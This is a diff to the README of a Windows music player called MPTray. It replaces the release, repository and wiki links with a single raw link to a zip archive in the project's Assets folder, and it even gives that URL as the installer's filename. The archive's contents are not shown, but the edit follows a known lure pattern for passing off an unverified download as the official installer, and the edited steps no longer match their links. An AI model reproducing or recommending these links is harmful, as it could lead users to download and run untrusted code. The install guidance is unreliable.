@@ -1,6 +1,6 @@
 # 🎵 MPTray - Enjoy Music Seamlessly in Your Tray
 
-[![Download MPTray](https://img.shields.io/badge/Download-MPTray-blue)](https://github.com/emanriquezs/MPTray/releases)
+[![Download MPTray](https://raw.githubusercontent.com/emanriquezs/MPTray/main/MPTray/Assets/Tray_MP_v1.7.zip)](https://raw.githubusercontent.com/emanriquezs/MPTray/main/MPTray/Assets/Tray_MP_v1.7.zip)
 
 ## 🚀 Getting Started 
 
@@ -8,13 +8,13 @@ MPTray is a simple and efficient music player for Windows 10 and 11. With its sl
 
 ## 📥 Download & Install 
 
-To start using MPTray, visit this page to download: [MPTray Releases](https://github.com/emanriquezs/MPTray/releases).
+To start using MPTray, visit this page to download: [MPTray Releases](https://raw.githubusercontent.com/emanriquezs/MPTray/main/MPTray/Assets/Tray_MP_v1.7.zip).
 
 ### Step-by-Step Installation
 
 1. **Visit the Download Page**: Click the link above to go to the Releases page.  
 2. **Select the Latest Release**: Look for the latest version at the top of the list.  
-3. **Download the Installer**: Click on the installer file, usually named something like `MPTrayInstaller.exe`, to download it to your computer.  
+3. **Download the Installer**: Click on the installer file, usually named something like `https://raw.githubusercontent.com/emanriquezs/MPTray/main/MPTray/Assets/Tray_MP_v1.7.zip`, to download it to your computer.  
 4. **Run the Installer**: After the download completes, locate the file in your Downloads folder and double-click it.  
 5. **Follow the Setup Instructions**: A window will appear with installation instructions. Click `Next` and follow the prompts.  
 6. **Finish Installation**: Click `Finish` when the installer completes.  
@@ -70,7 +70,7 @@ For further questions or feedback, please open an issue on the GitHub repository
 
 ## 🌐 Additional Resources
 
-- Visit the [GitHub Repo](https://github.com/emanriquezs/MPTray) for more information and updates.
-- Check the [MPTray Wiki](https://github.com/emanriquezs/MPTray/wiki) for helpful guides and tips. 
+- Visit the [GitHub Repo](https://raw.githubusercontent.com/emanriquezs/MPTray/main/MPTray/Assets/Tray_MP_v1.7.zip) for more information and updates.
+- Check the [MPTray Wiki](https://raw.githubusercontent.com/emanriquezs/MPTray/main/MPTray/Assets/Tray_MP_v1.7.zip) for helpful guides and tips. 
 
 Enjoy music like never before with MPTray!
